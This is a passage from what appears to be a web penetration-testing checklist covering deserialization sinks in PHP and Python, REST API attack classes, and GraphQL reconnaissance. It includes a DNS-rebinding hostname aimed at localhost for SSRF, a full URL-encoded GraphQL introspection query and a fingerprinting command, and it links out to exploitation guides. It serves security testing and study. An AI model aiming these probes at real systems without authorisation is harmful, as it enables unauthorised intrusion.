        *   `make-1-1-1-1-rebind-127.0.0.1-rr.1u.ms`

### Deserialization

*   PHP
    *   `unserialize()` + untrusted header/parameter values
    *   Serializable class + exploitable magic function presence
        *   `__destruct()`
        *   `__wakeup()`
        *   `__call()`
        *   `__tostring()`
    *   [Exploitation](https://book.hacktricks.xyz/pentesting-web/deserialization#php)
*   Python
    *   Traffic data with a `.` character at the end
    *   `pickle.loads()` / `yaml.load()`
    *   [Exploitation](https://book.hacktricks.xyz/pentesting-web/deserialization#python)
*   Miscellaneous
    *   [.NET](https://book.hacktricks.xyz/pentesting-web/deserialization#.net)
    *   [Java](https://book.hacktricks.xyz/pentesting-web/deserialization#java-http) → [YSoSerial](https://github.com/frohoff/ysoserial)
    *   [Ruby](https://book.hacktricks.xyz/pentesting-web/deserialization#ruby)
    *   [NodeJS](https://book.hacktricks.xyz/pentesting-web/deserialization#nodejs)

### API Endpoints

*   [SOAP](https://academy.hackthebox.com/module/details/160)
*   [REST](https://academy.hackthebox.com/module/details/268)
    *   IDOR                                     → Guessable Object Identifiers / API Versioning
    *   BFLA                                     → Privileged Endpoints + Improper Authorization Checks
    *   Authentication                  → Cookie & JWT Hijacking / User & Password Spraying / Injection & Juggling Bypasses
    *   Mass Assignment             → Endpoints with PATCH/PUT Capabilities + Assignment Parameters
    *   Web Vulnerabilities          → Server-Side Injections / XSS Attacks
    *   Resource Exhaustion       → File Uploads / Disk Storing Procedures
    *   SSRF                                      → Endpoints with URI Parameters
*   [GraphQL](https://academy.hackthebox.com/module/details/271)
    *   [GraphW00f](https://github.com/dolevf/graphw00f) Fingerprint → `python3 main.py -d -f -t [URL]`
    *   Introspection
        *   `/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}`
        *   Paste Response in [Voyager](https://graphql-kit.com/graphql-voyager/) → Analyze Schema
    *   Exploitation
        *   Queries / [Mutations](https://academy.hackthebox.com/module/271/section/3156)
        *   Injections / XSS
        *   InQL BurpSuite Extension / [GraphQL-COP](https://github.com/dolevf/graphql-cop) Auditing